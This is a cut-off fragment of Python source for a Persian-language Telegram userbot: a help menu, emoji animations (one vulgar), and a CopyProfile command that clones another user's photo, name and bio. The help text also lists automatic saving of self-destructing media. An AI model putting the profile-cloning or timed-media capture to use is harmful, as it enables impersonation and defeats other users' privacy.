    if message.text == "self" or message.text == "سلف" or message.text == "/help":
        await bot.send_message(chat_id=message.chat.id , text="""
.
< راهنمای سلف >

بلاک کردن کاربر ( ریپلای یا در پیوی ) => <pre>Block</pre>
                               
آنبلاک کردن کاربر ( ریپلای یا در پیوی ) => <pre>UnBlock</pre>

➖➖➖➖➖➖➖➖➖➖➖

تنظیم اسم => <pre>SetName</pre> (Reply)
                               
تنظیم بیو => <pre>SetBio</pre> (Reply)
                               
تنظیم پروفایل ( عکس , ویدیو ) ( ریپلای ) => <pre>SetProfile</pre>  
                               
➖➖➖➖➖➖➖➖➖➖➖

تایم در اسم => <pre>TimeName on | off</pre> 
                               
تایم در بیو => <pre>TimeBio on | off</pre> 
                               
فونت‌تایم‌=> <pre> ‌SetFont‌ 1‌ or‌ 2‌ or‌ 3‌ or‌ 4‌ or‌ Random</pre>
                               
➖➖➖➖➖➖➖➖➖➖➖

سیو ( عکس , فیلم ) تایم دار => خودکار
آنتی لاگین => خودکار
                               
➖➖➖➖➖➖➖➖➖➖➖

تبدیل متن به ویس => <pre>ویس اینجا متن قرار بدید</pre>
                               
هوش مصنوعی ( ChatGPT ) => <pre>gpt TEXT</pre>

➖➖➖➖➖➖➖➖➖➖➖

سرگرمی ها :
مربع , قلب , مکعب , لودینگ , قلب بزرگ , بکیرم

➖➖➖➖➖➖➖➖➖➖➖

ورژن 2
صفحه دوم راهنما => <pre>راهنما 2</pre><pre>help2</pre><pre>/help2</pre>

                    """ , reply_to_message_id=message.id , parse_mode=enums.ParseMode.HTML)
        
    if message.text == "help2" or message.text == "راهنما 2" or message.text == "/help2":
        await bot.send_message(chat_id=message.chat.id , text="""
.
< راهنمای سلف صفحه 2 >

کپی کردن پروفایل دیگران ( ریپلای یا در پیوی ) => <pre>CopyProfile</pre>
ریست پروفایل ( ریپلای یا در پیوی ) => <pre>UnCopyProfile</pre>

➖➖➖➖➖➖➖➖➖➖➖

دانلود از یوتیوب ( بجای LINK لینکتون بزارید ) => <pre>!YouTube LINK</pre>
                               
➖➖➖➖➖➖➖➖➖➖➖

ست انمی ( ریپلای یا در پیوی )  => SetEnemy
حذف انمی ( ریپلای یا در پیوی )  => DelEnemy
                               
سکوت کاربر ( ریپلای یا در پیوی )  => Mute
حذف سکوت کاربر ( ریپلای یا در پیوی )  => UnMute
                               
➖➖➖➖➖➖➖➖➖➖➖
                               
بولد متن => <pre>bold on | off</pre> 
ایتالیک متن => <pre>italic on | off</pre> 
پارت پارت متن => <pre>part on | off</pre> 
لینک دار متن => <pre>link on | off</pre> 
زیرخط متن => <pre>underline on | off</pre> 

➖➖➖➖➖➖➖➖➖➖➖

حالت در حال بازی => <pre>playing on | off</pre> 
حالت در حال تایپ => <pre>typing on | off</pre> 
حالت در حال رکورد ویدیو => <pre>RECORD_VIDEO on | off</pre> 
حالت در حال انتخاب استیکر => <pre>CHOOSE_STICKER on | off</pre> 
حالت در حال ارسال ویدیو => <pre>UPLOAD_VIDEO on | off</pre> 
حالت در حال ارسال فایل => <pre>UPLOAD_DOCUMENT on | off</pre> 
حالت در حال ارسال موزیک => <pre>UPLOAD_AUDIO on | off</pre> 
حالت در حال ضبط صدا => <pre>SPEAKING on | off</pre> 
                               

ورژن 2

                    """ , reply_to_message_id=message.id , parse_mode=enums.ParseMode.HTML)


    if message.text == "CopyProfile":
        await bot.edit_message_text(chat_id=message.chat.id , text="Whate . . ." , message_id=message.id)
        if message.reply_to_message:
            profileBio = await bot.invoke(pyrogram.raw.functions.users.GetFullUser(id=await bot.resolve_peer(message.reply_to_message.from_user.id)))

            if message.reply_to_message.from_user.photo.big_file_id:
                ProfilePhoto = message.reply_to_message.from_user.photo.big_file_id
            
                rand = random.randint(1000, 9999999)
                local = f"downloads/photo-{rand}.png"
                await bot.download_media(message=ProfilePhoto, file_name=local)
                await bot.set_profile_photo(photo=local)
                os.remove(local)

            if message.reply_to_message.from_user.first_name :
                Name = message.reply_to_message.from_user.first_name
                await bot.update_profile(first_name=Name )

            if profileBio.full_user.about :
                await bot.update_profile(bio=profileBio.full_user.about )
            
            await bot.edit_message_text(chat_id=message.chat.id , text="Profile Copyed" , message_id=message.id)
        else:

            profileBio = await bot.invoke(pyrogram.raw.functions.users.GetFullUser(id=await bot.resolve_peer(message.chat.id)))
            
            if message.chat.photo.big_file_id :
                ProfilePhoto = message.chat.photo.big_file_id
                rand = random.randint(1000, 9999999)
                local = f"downloads/photo-{rand}.png"
                await bot.download_media(message=ProfilePhoto, file_name=local)
                await bot.set_profile_photo(photo=local)
                os.remove(local)

            if message.chat.first_name:
                Name = message.chat.first_name
                await bot.update_profile(first_name=Name )

            if profileBio.full_user.about:
                await bot.update_profile(bio=profileBio.full_user.about )
                
            
            await bot.edit_message_text(chat_id=message.chat.id , text="Profile Copyed" , message_id=message.id)

    if message.text == "UnCopyProfile":
            
            with open(f"data/{admin}/name.txt", "r" , encoding="utf-8") as file1:
                name = file1.read()
            
            with open(f"data/{admin}/bio.txt", "r" , encoding="utf-8") as file:
                bio = file.read()

            await bot.set_profile_photo(photo=f"data/{admin}/profile.png")

            await bot.update_profile(first_name=name , bio=bio)
            
            await bot.edit_message_text(chat_id=message.chat.id , text="Profile is Reasted" , message_id=message.id)

    if message.text == "قلب بزرگ":
        msg = await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
        """ , message_id=message.id)

        msgid = message.id

        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
                                """ , message_id=msgid)
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
                                """ , message_id=msgid)
        
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
                                """ , message_id=msgid)
        
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
                                """ , message_id=msgid)
        
        
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
                                """ , message_id=msgid)
        
        
        await bot.edit_message_text(chat_id=message.chat.id , text="""
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
                                """ , message_id=msgid)

    if message.text == "بکیرم" or message.text == 'به کیرم':
        msg_id = message.id
        chat_id = message.chat.id
        bk1 = "\n😂😂😂          😂         😂\n😂         😂      😂       😂\n😂           😂    😂     😂\n😂        😂       😂   😂\n😂😂😂          😂😂\n😂         😂      😂   😂\n😂           😂    😂      😂\n😂           😂    😂        😂\n😂        😂       😂          😂\n😂😂😂          😂            😂\n"
        bk2 = "\n🤤🤤🤤          🤤         🤤\n🤤         🤤      🤤       🤤\n🤤           🤤    🤤     🤤\n🤤        🤤       🤤   🤤\n🤤🤤🤤          🤤🤤\n🤤         🤤      🤤   🤤\n🤤           🤤    🤤      🤤\n🤤           🤤    🤤        🤤\n🤤        🤤       🤤          🤤\n🤤🤤🤤          🤤            🤤\n"
        bk3 = "\n💩💩💩          💩         💩\n💩         💩      💩       💩\n💩           💩    💩     💩\n💩        💩       💩   💩\n💩💩💩          💩💩\n💩         💩      💩   💩\n💩           💩    💩      💩\n💩           💩    💩        💩\n💩        💩       💩          💩\n💩💩💩          💩            💩\n"
        bk4 = "\n🌹🌹🌹          🌹         🌹\n🌹         🌹      🌹       🌹\n🌹           🌹    🌹     🌹\n🌹        🌹       🌹   🌹\n🌹🌹🌹          🌹🌹\n🌹         🌹      🌹   🌹\n🌹           🌹    🌹      🌹\n🌹           🌹    🌹        🌹\n🌹        🌹       🌹          🌹\n🌹🌹🌹          🌹            🌹\n"
        bk5 = "\n💀💀💀          💀         💀\n💀         💀      💀       💀\n💀           💀    💀     💀\n💀        💀       💀   💀\n💀💀💀          💀💀\n💀         💀      💀   💀\n💀           💀    💀      💀\n💀           💀    💀        💀\n💀        💀       💀          💀\n💀💀💀          💀            💀\n"
        bk6 = "\n🌑🌑🌑          🌑         🌑\n🌑         🌑      🌑       🌑\n🌑           🌑    🌑     🌑\n🌑        🌑       🌑   🌑\n🌑🌑🌑          🌑🌑\n🌑         🌑      🌑   🌑\n🌑           🌑    🌑      🌑\n🌑           🌑    🌑        🌑\n🌑        🌑       🌑          🌑\n🌑🌑🌑          🌑            🌑\n"
        bk7 = "\n🌒🌒🌒          🌒         🌒\n🌒         🌒      🌒       🌒\n🌒           🌒    🌒     🌒\n🌒        🌒       🌒   🌒\n🌒🌒🌒          🌒🌒\n🌒         🌒      🌒   🌒\n🌒           🌒    🌒      🌒\n🌒           🌒    🌒        🌒\n🌒        🌒       🌒          🌒\n🌒🌒🌒          🌒            🌒\n"
        bk8 = "\n🌓🌓🌓          🌓         🌓\n🌓         🌓      🌓       🌓\n🌓           🌓    🌓     🌓\n🌓        🌓       🌓   🌓\n🌓🌓🌓          🌓🌓\n🌓         🌓      🌓   🌓\n🌓           🌓    🌓      🌓\n🌓           🌓    🌓        🌓\n🌓        🌓       🌓          🌓\n🌓🌓🌓          🌓            🌓\n"
        bk9 = "\n🌔🌔🌔          🌔         🌔\n🌔         🌔      🌔       🌔\n🌔           🌔    🌔     🌔\n🌔        🌔       🌔   🌔\n🌔🌔🌔          🌔🌔\n🌔         🌔      🌔   🌔\n🌔           🌔    🌔      🌔\n🌔           🌔    🌔        🌔\n🌔        🌔       🌔          🌔\n🌔🌔🌔          🌔            🌔\n"
        bk10 = "\n🌕🌕🌕          🌕         🌕\n🌕         🌕      🌕       🌕\n🌕           🌕    🌕     🌕\n🌕        🌕       🌕   🌕\n🌕🌕🌕          🌕🌕\n🌕         🌕      🌕   🌕\n🌕           🌕    🌕      🌕\n🌕           🌕    🌕        🌕\n🌕        🌕       🌕          🌕\n🌕🌕🌕          🌕            🌕\n"
        bk11 = "\n🌖🌖🌖          🌖         🌖\n🌖         🌖      🌖       🌖\n🌖           🌖    🌖     🌖\n🌖        🌖       🌖   🌖\n🌖🌖🌖          🌖🌖\n🌖         🌖      🌖   🌖\n🌖           🌖    🌖      🌖\n🌖           🌖    🌖        🌖\n🌖        🌖       🌖          🌖\n🌖🌖🌖          🌖            🌖\n"
        bk12 = "\n🌗🌗🌗          🌗         🌗\n🌗         🌗      🌗       🌗\n🌗           🌗    🌗     🌗\n🌗        🌗       🌗   🌗\n🌗🌗🌗          🌗🌗\n🌗         🌗      🌗   🌗\n🌗           🌗    🌗      🌗\n🌗           🌗    🌗        🌗\n🌗        🌗       🌗          🌗\n🌗🌗🌗          🌗            🌗\n"
        bk13 = "\n🌘🌘🌘          🌘         🌘\n🌘         🌘      🌘       🌘\n🌘           🌘    🌘     🌘\n🌘        🌘       🌘   🌘\n🌘🌘🌘          🌘🌘\n🌘         🌘      🌘   🌘\n🌘           🌘    🌘      🌘\n🌘           🌘    🌘        🌘\n🌘        🌘       🌘          🌘\n🌘🌘🌘          🌘            🌘\n"
        bk14 = "\n🌙🌙🌙          🌙         🌙\n🌙         🌙      🌙       🌙\n🌙           🌙    🌙     🌙\n🌙        🌙       🌙   🌙\n🌙🌙🌙          🌙🌙\n🌙         🌙      🌙   🌙\n🌙           🌙    🌙      🌙\n🌙           🌙    🌙        🌙\n🌙        🌙       🌙          🌙\n🌙🌙🌙          🌙            🌙\n"
        bk15 = "\n🪐🪐🪐          🪐         🪐\n🪐         🪐      🪐       🪐\n🪐           🪐    🪐     🪐\n🪐        🪐       🪐   🪐\n🪐🪐🪐          🪐🪐\n🪐         🪐      🪐   🪐\n🪐           🪐    🪐      🪐\n🪐           🪐    🪐        🪐\n🪐        🪐       🪐          🪐\n🪐🪐🪐          🪐            🪐\n"
        await bot.edit_message_text(chat_id, msg_id, bk1)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk2)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk3)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk4)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk5)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk6)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk7)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk8)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk9)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk10)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk11)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk12)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk13)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk14)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, bk15)
        time.sleep(1)
        await bot.edit_message_text(chat_id, msg_id, "کلا بکیرم")


    if message.text == 'مکعب':

        mk = ['🟥', '🟧', '🟨', '🟩', '🟦', '🟪', '⬛️', '⬜️', '🟫']
        
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
""" , message_id=message.id)
        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
